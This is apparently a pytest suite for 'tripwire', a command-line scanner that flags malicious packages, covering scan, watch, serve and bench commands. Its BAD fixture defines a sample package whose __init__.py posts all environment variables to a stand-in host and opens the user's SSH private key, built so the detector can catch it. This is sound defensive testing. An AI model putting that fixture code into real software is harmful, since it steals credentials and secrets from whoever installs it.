"""The tripwire command line."""

import json

import pytest

from tripwire import cli
from tripwire.bench.archive import tar_gz
from tripwire.pipeline import RunStats

CLEAN = {"PKG-INFO": "Name: tidy\nVersion: 1.0\nSummary: tidy\n", "tidy/__init__.py": "x = 1\n"}
BAD = {"PKG-INFO": "Name: leaky\nVersion: 1.0\nSummary: x\n",
       "leaky/__init__.py": "import os, requests\nrequests.post('https://exfil.example.invalid', "
                            "json=dict(os.environ))\nopen(os.path.expanduser('~/.ssh/id_rsa'))\n"}


def sdist(tmp_path, files, name):
    p = tmp_path / f"{name}-1.0.tar.gz"
    p.write_bytes(tar_gz(files, f"{name}-1.0/"))
    return p


def test_scan_clean_archive(tmp_path, quarantine, capsys):
    code = cli.main(["scan", str(sdist(tmp_path, CLEAN, "tidy")), "--quarantine", str(quarantine)])
    out = capsys.readouterr().out
    assert code == 0 and "tidy 1.0 (pypi)" in out and "not flagged" in out


def test_scan_flagged_archive(tmp_path, quarantine, capsys):
    code = cli.main(["scan", str(sdist(tmp_path, BAD, "leaky")), "--quarantine", str(quarantine)])
    out = capsys.readouterr().out
    assert code == 1 and "FLAGGED" in out and "network/env_sent" in out and "leaky/__init__.py:2" in out


def test_scan_json(tmp_path, quarantine, capsys):
    cli.main(["scan", str(sdist(tmp_path, BAD, "leaky")), "--json", "--quarantine", str(quarantine)])
    data = json.loads(capsys.readouterr().out)
    assert data["flagged"] and {"credentials", "network"} <= set(data["fired_analyzers"])


def test_scan_directory(tmp_path, capsys):
    (tmp_path / "proj").mkdir()
    (tmp_path / "proj" / "mod.py").write_text("x = 1\n")
    assert cli.main(["scan", str(tmp_path / "proj"), "--name", "proj", "--pkg-version", "0.1"]) == 0
    assert "proj 0.1" in capsys.readouterr().out


def test_scan_overrides(tmp_path, quarantine, capsys):
    cli.main(["scan", str(sdist(tmp_path, CLEAN, "tidy")), "--name", "reqeusts", "--ecosystem", "pypi",
              "--quarantine", str(quarantine)])
    assert "typosquat/name_lookalike" in capsys.readouterr().out


def test_scan_missing_path(tmp_path, capsys):
    assert cli.main(["scan", str(tmp_path / "nope.tgz")]) == 2
    assert "no such file" in capsys.readouterr().err


def test_scan_refused_archive(tmp_path, quarantine, capsys):
    p = tmp_path / "bad.tgz"
    p.write_bytes(b"definitely not an archive")
    assert cli.main(["scan", str(p), "--quarantine", str(quarantine)]) == 2
    assert "refused to extract" in capsys.readouterr().err


def test_all_flag_shows_context_findings(tmp_path, quarantine, capsys):
    files = {"package/package.json": json.dumps({"name": "native", "version": "1.0.0",
                                                 "scripts": {"install": "node-gyp rebuild"}})}
    p = tmp_path / "native.tgz"
    p.write_bytes(tar_gz(files))
    cli.main(["scan", str(p), "--quarantine", str(quarantine)])
    assert "context-only finding" in capsys.readouterr().out
    cli.main(["scan", str(p), "--all", "--quarantine", str(quarantine)])
    assert "npm_hook_build" in capsys.readouterr().out


def test_terminal_escapes_are_neutralised():
    s = cli.safe_text("evil\x1b[2J\rname‮txt.exe\nnext")
    assert "\x1b" not in s and "\r" not in s and "‮" not in s and "\n" not in s
    assert "\\u001b" in s and "\\u202e" in s
    assert cli.safe_text("plain name 1.0") == "plain name 1.0"


def test_watch_prints_summary_and_writes_json(tmp_path, monkeypatch, capsys):
    seen = {}

    def fake_live_run(db, **kw):
        seen.update(kw)
        s = RunStats(seen=3, scanned=3, flagged=1)
        s.levels = {"none": 2, "high": 1}
        s.scan_seconds = [0.01, 0.02, 0.03]
        return s

    monkeypatch.setattr("tripwire.pipeline.live_run", fake_live_run)
    out_json = tmp_path / "stats.json"
    code = cli.main(["watch", "--db", str(tmp_path / "w.db"), "--quarantine", str(tmp_path / "q"), "--limit", "5",
                     "--once", "--ecosystem", "npm", "--stats-json", str(out_json)])
    out = capsys.readouterr().out
    assert code == 0 and "scanned 3" in out and "high 1" in out and "p50 20.0 ms" in out
    assert seen["max_releases"] == 5 and seen["once"] is True and seen["ecosystems"] == ("npm",)
    assert seen["seconds"] is None
    assert json.loads(out_json.read_text())["flagged"] == 1


def test_watch_minutes(tmp_path, monkeypatch, capsys):
    seen = {}
    monkeypatch.setattr("tripwire.pipeline.live_run", lambda db, **kw: seen.update(kw) or RunStats())
    cli.main(["watch", "--db", str(tmp_path / "w.db"), "--minutes", "1.5"])
    assert seen["seconds"] == 90 and seen["ecosystems"] == ("pypi", "npm")


def test_watch_rejects_zero_limit(tmp_path, capsys):
    assert cli.main(["watch", "--db", str(tmp_path / "w.db"), "--limit", "0"]) == 2


def test_serve_starts_uvicorn_with_the_app(tmp_path, monkeypatch, capsys):
    calls = {}
    monkeypatch.setattr("uvicorn.run", lambda app, **kw: calls.update(app=app, **kw))
    assert cli.main(["serve", "--db", str(tmp_path / "s.db"), "--port", "8765"]) == 0
    assert calls["port"] == 8765 and calls["host"] == "127.0.0.1" and calls["app"].title == "Tripwire"


def test_serve_warns_when_exposed(tmp_path, monkeypatch, capsys):
    monkeypatch.setattr("uvicorn.run", lambda app, **kw: None)
    cli.main(["serve", "--db", str(tmp_path / "s.db"), "--host", "0.0.0.0"])
    assert "no login" in capsys.readouterr().err


def test_bench_command(monkeypatch, tmp_path, capsys):
    from tripwire.bench import run as bench_run
    from tripwire.bench.corpus import FIXTURES
    monkeypatch.setattr(bench_run, "FIXTURES", FIXTURES[:2] + FIXTURES[-2:])
    original = bench_run.run_corpus
    monkeypatch.setattr(bench_run, "run_corpus", lambda fixtures=None: original(FIXTURES[:2] + FIXTURES[-2:]))
    assert cli.main(["bench", "--labels", str(tmp_path / "labels.csv")]) == 0
    out = capsys.readouterr().out
    assert "Tripwire benchmark: 4 fixtures" in out and "not real-world detection rates" in out
    assert (tmp_path / "labels.csv").read_text().startswith("id,ecosystem")


def test_command_is_required(capsys):
    with pytest.raises(SystemExit):
        cli.main([])


def test_version(capsys):
    with pytest.raises(SystemExit):
        cli.main(["--version"])
    assert "tripwire 0.1.0" in capsys.readouterr().out
